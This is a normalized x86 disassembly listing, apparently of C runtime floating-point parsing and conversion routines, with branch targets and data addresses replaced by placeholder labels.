movzx eax [ ecx ]
and edx 0x7fff
push esi
sub edx 0x3fff
push edi
mov edi [ ebp + 0xc ]
shl eax 0x10
xor ebx ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
dec eax
movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x34 ] eax
mov eax ecx
cdq
push 0x1f
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov ecx esi
shl eax cl
push 0x3
or edi 0xffffffff
mov [ ebp - 0x30 ] esi
pop esi
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
xor eax eax
inc eax
shl eax cl
push 0xffffffff
mov [ ebp - 0x2c ] ebx
pop edi
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
mov eax edx
cdq
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
push 0x20
mov [ ebp - 0x20 ] ebx
not eax
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
pop eax
mov ebx ecx
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
shl edi cl
push 0x20
pop eax
sub eax ecx
mov [ ebp - 0x38 ] ecx
not edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
and eax [ ebp - 0x28 ]
mov ecx edi
shr edx cl
mov ecx [ ebp - 0x38 ]
shl eax cl
or edx [ ebp - 0x20 ]
inc ebx
mov [ ebp + ebx * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
mov eax [ ebp - 0x3c ]
xor ebx ebx
pop ecx
or edi 0xffffffff
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x24 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
inc esi
mov [ ebp + esi * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
mov ecx [ ebp - 0x28 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
add esi [ rw-data ]
xor ebx ebx
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
xor eax eax
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
shl edi cl
mov eax ebx
push 0x20
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
not edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
push 0xffffffff
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
sub_43966c
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x68 ] eax
xor eax eax
push ebx
xor ebx ebx
inc eax
push esi
mov [ ebp - 0x60 ] eax
mov eax ebx
push edi
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov esi ebx
mov [ ebp - 0x54 ] ebx
cmp [ ebp + 0x24 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edx ecx
mov [ ebp - 0x50 ] edx
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
xor eax eax
jmp r-xdata
inc ecx
jmp r-xdata
cmp dl 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov dl [ ecx ]
cmp dl 0x20
je r-xdata
cmp dl 0xa
je r-xdata
cmp dl 0xd
jne r-xdata
mov dl [ ecx ]
inc ecx
cmp eax 0xb
ja r-xdata
cmp eax 0xa
jne r-xdata
jmp [ eax * 4 + jump_table_439db8 ]
jmp r-xdata
lea eax [ edx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
lea eax [ edx - 0x31 ]
cmp al 0x8
jbe r-xdata
lea eax [ edx - 0x31 ]
cmp al 0x8
jbe r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
cmp dl 0x30
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
xor eax eax
inc eax
sub dl 0x30
mov [ ebp - 0x58 ] eax
cmp dl 0x9
ja r-xdata
lea eax [ ecx - 0x2 ]
mov [ ebp - 0x50 ] eax
lea eax [ edx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x5c ] eax
jmp r-xdata
lea eax [ edx - 0x31 ]
cmp al 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
xor eax eax
inc eax
mov [ ebp - 0x5c ] eax
mov esi ebx
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
jne r-xdata
push 0x3
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
jne r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
je r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp dl [ eax ]
je r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp dl 0x30
cmp dl 0x30
jne r-xdata
mov ecx [ ebp - 0x50 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax dl
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp dl 0x30
je r-xdata
cmp dl 0x30
jmp r-xdata
push 0xa
pop eax
dec ecx
lea eax [ ecx - 0x1 ]
mov [ ebp - 0x50 ] eax
movsx eax dl
sub eax 0x2b
je r-xdata
cmp dl 0x30
jge r-xdata
mov eax ebx
mov esi ebx
push 0x4
cmp eax 0x18
jbe r-xdata
movsx eax dl
sub eax 0x2b
je r-xdata
push 0x5
cmp dl 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp dl 0x30
je r-xdata
cmp dl 0x2b
je r-xdata
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4c ] eax
mov esi ebx
cmp eax 0x19
jae r-xdata
cmp dl 0x2b
je r-xdata
mov esi [ ebp - 0x54 ]
jl r-xdata
mov eax [ ebp - 0x54 ]
pop eax
dec ecx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov dl [ ecx ]
inc ecx
sub dl 0x31
cmp dl 0x8
ja r-xdata
jne r-xdata
dec eax
dec eax
jne r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x54 ]
mov al [ ebp - 0x9 ]
cmp al 0x5
jl r-xdata
push 0x2
pop eax
mov [ ebp - 0x6c ] ebx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec ecx
push 0xb
jmp r-xdata
cmp dl 0x2d
je r-xdata
pop eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp dl 0x2d
je r-xdata
inc esi
sub dl 0x30
inc eax
mov [ edi ] dl
inc edi
jmp r-xdata
cmp dl 0x2d
je r-xdata
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4c ] eax
mov esi ebx
cmp eax 0x19
jae r-xdata
mov dl [ ecx ]
dec eax
inc ecx
cmp dl 0x30
je r-xdata
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x4c ]
push 0x7
or edx 0xffffffff
pop eax
mov [ ebp - 0x60 ] edx
jmp r-xdata
sub eax 0x3
dec ecx
jmp r-xdata
push 0x8
jmp r-xdata
or [ ebp - 0x60 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
cmp dl 0x30
jge r-xdata
imul esi esi 0xa
movsx eax dl
add esi 0xffffffd0
add esi eax
cmp esi 0x1450
jg r-xdata
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
jmp r-xdata
dec edi
cmp [ edi ] bl
jne r-xdata
mov ecx [ ebp - 0x54 ]
dec edi
push 0x18
inc ecx
pop eax
mov [ ebp - 0x54 ] ecx
jmp r-xdata
inc al
mov [ ebp - 0x9 ] al
push 0x2
mov edx 0x8000
pop eax
mov [ ebp - 0x6c ] edx
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp dl 0x30
je r-xdata
jmp r-xdata
cmp dl 0x39
jg r-xdata
mov dl [ ecx ]
inc ecx
cmp dl 0x30
jge r-xdata
cmp dl 0x43
jle r-xdata
mov dl [ ecx ]
inc ecx
cmp dl 0x30
jge r-xdata
sub dl 0x30
inc eax
mov [ edi ] dl
inc edi
dec esi
cmp dl 0x39
jg r-xdata
mov esi 0x1451
jmp r-xdata
mov dl [ ecx ]
inc ecx
mov edi [ ebp - 0x74 ]
or eax [ ebp - 0x6c ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov [ edi + 0x2 ] edx
mov [ edi + 0x6 ] esi
mov eax ebx
lea ecx [ ebp - 0x3c ]
push ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_43ac51
mov edx [ ebp - 0x60 ]
add esp 0xc
test edx edx
jns r-xdata
dec eax
inc ecx
dec edi
cmp [ edi ] bl
je r-xdata
test eax eax
je r-xdata
cmp dl 0x43
jle r-xdata
dec ecx
jmp r-xdata
cmp dl 0x45
jle r-xdata
cmp dl 0x39
jg r-xdata
mov dl [ ecx ]
inc ecx
mov eax [ ebp - 0x5c ]
add esi [ ebp - 0x54 ]
test eax eax
jne r-xdata
neg esi
mov [ ebp - 0x54 ] ecx
cmp dl 0x45
jle r-xdata
mov edx [ ebp - 0x68 ]
mov [ edx ] ecx
mov ecx [ ebp - 0x64 ]
test ecx ecx
je r-xdata
push 0x6
jmp r-xdata
sub dl 0x64
cmp dl 0x1
jbe r-xdata
mov eax [ ebp - 0x58 ]
test eax eax
jne r-xdata
add esi [ ebp + 0x18 ]
sub dl 0x64
cmp dl 0x1
ja r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ ebp + 0x1c ]
mov eax 0x7fff
mov esi 0x80000000
push 0x2
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx ebx
mov edx ebx
pop ebx
xor edi edi
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
lea ebx [ edi + 0x1 ]
jmp r-xdata
mov eax rw-data
sub eax 0x60
test esi esi
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x3a ]
mov esi [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov eax rw-data
neg esi
sub eax 0x60
test esi esi
jne r-xdata
xor ecx ecx
mov [ ebp - 0x3c ] cx
jmp r-xdata
mov ecx esi
add eax 0x54
sar esi 0x3
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x54 ] esi
and ecx 0x7
je r-xdata
imul ecx ecx 0xc
add ecx eax
mov eax 0x8000
mov [ ebp - 0x50 ] ecx
cmp [ ecx ] ax
jb r-xdata
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x32 ]
mov eax edi
xor eax edx
and eax 0x8000
mov [ ebp - 0x60 ] eax
mov eax 0x7fff
and edx eax
and edi eax
mov [ ebp - 0x78 ] ebx
lea eax [ edi + edx ]
movzx esi ax
mov eax 0x7fff
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x5c ] esi
cmp dx ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
mov [ ebp - 0x50 ] ecx
xor eax eax
cmp [ ebp - 0x60 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x34 ] eax
cmp di ax
jae r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
test dx dx
jne r-xdata
mov [ ebp - 0x34 ] ebx
jmp r-xdata
test di di
jne r-xdata
inc esi
test [ ebp - 0x34 ] 0x7fffffff
mov [ ebp - 0x5c ] esi
jne r-xdata
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
push 0x5
mov eax ebx
pop edi
mov [ ebp - 0x70 ] eax
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x68 ] edi
inc esi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x5c ] esi
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
add edx 0x2
inc eax
dec edi
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x68 ] edi
test edi edi
jg r-xdata
lea esi [ ebp - 0x3c ]
lea esi [ esi + eax * 2 ]
lea eax [ ecx + 0x8 ]
mov [ ebp - 0x64 ] eax
mov ecx edi
cmp [ ecx + 0x4 ] ebx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov [ ebp - 0x58 ] edi
test edi edi
jle r-xdata
mov esi [ ebp - 0x5c ]
mov edx [ ebp - 0x24 ]
mov edi [ ebp - 0x2c ]
add esi 0xc002
mov [ ebp - 0x50 ] edx
test si si
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp edi [ ebp - 0x58 ]
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
mov eax 0xffff
add esi eax
test si si
jns r-xdata
test edx edx
js r-xdata
mov [ edx - 0x4 ] edi
test eax eax
je r-xdata
mov eax [ ebp - 0x7c ]
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
mov ax [ ebp - 0x2c ]
mov ebx [ ebp - 0x78 ]
mov eax esi
neg eax
movzx eax ax
mov [ ebp - 0x68 ] eax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0x28 ]
mov ecx eax
mov edx edi
shr edx 0x1f
add eax eax
or eax edx
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
shr ecx 0x1f
add edx edx
mov eax 0xffff
or edx ecx
add edi edi
add esi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x24 ] edx
test si si
jg r-xdata
mov eax [ ebp - 0x64 ]
sub eax 0x2
add esi 0x2
dec ecx
mov [ ebp - 0x64 ] eax
test ecx ecx
jg r-xdata
inc [ edx ]
mov eax [ ebp - 0x2a ]
cmp eax 0xffffffff
jne r-xdata
and edi 0x1ffff
cmp edi 0x18000
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov eax edx
shl eax 0x1f
mov [ ebp - 0x50 ] ecx
shr [ ebp - 0x50 ] 0x1
or [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
shl ecx 0x1f
shr edi 0x1
shr edx 0x1
or edi ecx
dec [ ebp - 0x68 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] edi
jne r-xdata
inc ebx
movzx eax [ eax ]
mov [ ebp - 0x58 ] eax
movzx eax [ esi ]
mov edi [ ebp - 0x58 ]
imul edi eax
mov [ ebp - 0x58 ] edi
add edi [ edx - 0x4 ]
mov [ ebp - 0x7c ] ebx
cmp edi [ edx - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x50 ]
mov edi [ ebp - 0x68 ]
mov eax [ ebp - 0x70 ]
inc eax
mov [ ebp - 0x2a ] eax
mov eax [ ebp - 0x26 ]
mov [ ebp - 0x2a ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x50 ]
test [ ebp - 0x2c ] 0x1
je r-xdata
push 0x0
test ebx ebx
mov [ ebp - 0x50 ] edx
pop ebx
je r-xdata
mov ax [ ebp - 0x2a ]
or esi [ ebp - 0x60 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] si
jmp r-xdata
inc eax
mov [ ebp - 0x26 ] eax
mov ax [ ebp - 0x22 ]
mov ecx 0xffff
mov [ ebp - 0x26 ] ebx
cmp ax cx
jne r-xdata
mov ax di
xor edi edi
inc edi
or ax di
mov [ ebp - 0x2c ] ax
mov edi [ ebp - 0x2c ]
jmp r-xdata
mov edx 0x7fff
cmp si dx
jae r-xdata
inc ax
mov [ ebp - 0x22 ] ax
jmp r-xdata
mov [ ebp - 0x22 ] dx
inc esi
jmp r-xdata
mov edx 0x8000
cmp ax dx
ja r-xdata
mov ecx [ ebp - 0x24 ]
jmp r-xdata
sub_439de8
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi 0x8000
and edx esi
movzx esi [ ebp + 0x10 ]
xor ecx ecx
mov eax 0x7fff
inc ecx
and esi eax
push edi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x78 ] edx
mov [ ebp - 0x68 ] eax
test dx dx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp si ax
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test si si
jne r-xdata
movzx edx si
mov eax edx
imul edx edx 0x4d10
shr eax 0x8
mov ecx edi
shr ecx 0x18
add edx 0xecbced0c
lea eax [ eax + ecx * 2 ]
imul eax eax 0x4d
add eax edx
sar eax 0x10
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] eax
xor eax eax
mov [ ebp - 0x48 ] ecx
movsx ecx cx
mov [ ebp - 0x20 ] ax
neg ecx
mov eax rw-data
sub eax 0x60
xor ebx ebx
mov [ ebp - 0x16 ] si
mov [ ebp - 0x1a ] edi
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x5c ] 0x5
mov [ ebp - 0x6c ] 0xbffd
mov [ ebp - 0x58 ] 0x3fbf
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
mov edx 0x80000000
mov [ ebx ] cx
mov ecx [ ebp + 0x8 ]
cmp eax edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
jns r-xdata
test eax 0x40000000
jne r-xdata
test ecx ecx
je r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x8000
cmp dx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] cl
mov [ ebx + 0x4 ] 0x30
mov eax ecx
jmp r-xdata
test [ ebp + 0x18 ] 0x1
mov ecx [ ebp - 0x70 ]
mov eax [ ebp - 0x48 ]
mov edi [ ebp + 0x14 ]
mov [ ecx ] ax
je r-xdata
inc [ ebp - 0x48 ]
mov ecx eax
mov eax [ ebp - 0x26 ]
mov edi eax
xor edi ecx
and edi 0x8000
mov [ ebp - 0x54 ] edi
mov edi 0x7fff
and eax edi
and ecx edi
mov [ ebp - 0x74 ] eax
add eax ecx
movzx edi ax
mov eax 0x7fff
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4c ] edi
cmp cx ax
jae r-xdata
je r-xdata
neg ecx
mov eax rw-data
sub eax 0x60
mov [ ebp - 0x44 ] ecx
test ecx ecx
cmp [ ebp - 0x78 ] 0x0
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
